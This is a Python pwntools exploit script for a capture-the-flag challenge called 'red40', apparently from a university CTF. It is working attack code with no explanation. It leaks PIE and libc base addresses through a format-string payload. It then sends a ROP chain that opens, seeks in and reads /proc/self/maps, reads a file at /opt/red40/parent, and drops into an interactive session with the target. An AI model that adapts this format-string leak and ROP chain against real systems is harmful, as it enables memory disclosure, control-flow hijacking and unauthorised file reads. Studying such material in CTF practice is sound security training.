from pwn import *
from icecream import ic

elf = exe = ELF("./red40")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("red40.ctf.umasscybersec.org", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

sla(b">",b"2")
while (b"YOU WON!!!" not in ru(b">")):
    sl(b"Y")

sl(b"1")
ru(b"appreciating your ")
ppid = int(ru(" ").strip())

sla(b">",b"3")

ru(b"RED40?")

fmstr = b"%13$p %21$p"

sl(fmstr)

ru(">")
pie = int(ru(" ").strip(),0x10) - 0x189a
libc = int(rl().strip(),0x10) - 0x29d90
ru(b"RED40?????")

ic(hex(pie))
ic(hex(libc))

poprdi   = libc + 0x2a3e5
open     = libc + 0x1144e0
reads     = libc + 0x1147d0
writes    = libc + 0x114870
lseek    = libc + 0x114910
poprax   = libc + 0x45eb0
poprsi   = libc + 0x141d5e
poprdx2  = libc + 0x904a9
bss      = pie  + 0x04600
readfile = pie  + 0x1b0b
puts     = libc + 0x80e50
gets     = libc + 0x80520
ret      = libc + 0xf8fa3

payload = ((f"/proc/self/maps").encode().ljust(0x30,b"a") + p64(bss) + 
           p64(poprdi) + p64(bss) + p64(gets) + p64(poprdi) + p64(bss) +
           p64(poprdi) + p64(bss) + p64(poprsi) + p64(0x0) + p64(open) +
           p64(poprdi) + p64(3) + p64(poprsi) + p64(8218) + p64(poprdx2) + 2*p64(0x0) + p64(lseek) +
           p64(poprdi) + p64(3) + p64(poprsi) + p64(bss) + p64(poprdx2) + 2*p64(0x100) + p64(reads) +
           p64(poprdi) + p64(bss) + p64(poprsi) + p64(0x0) + p64(poprdx2) + 2*p64(0x100) + p64(writes) +
           p64(readfile))

sl(payload)

sl((f"/opt/red40/parent").encode())

i()
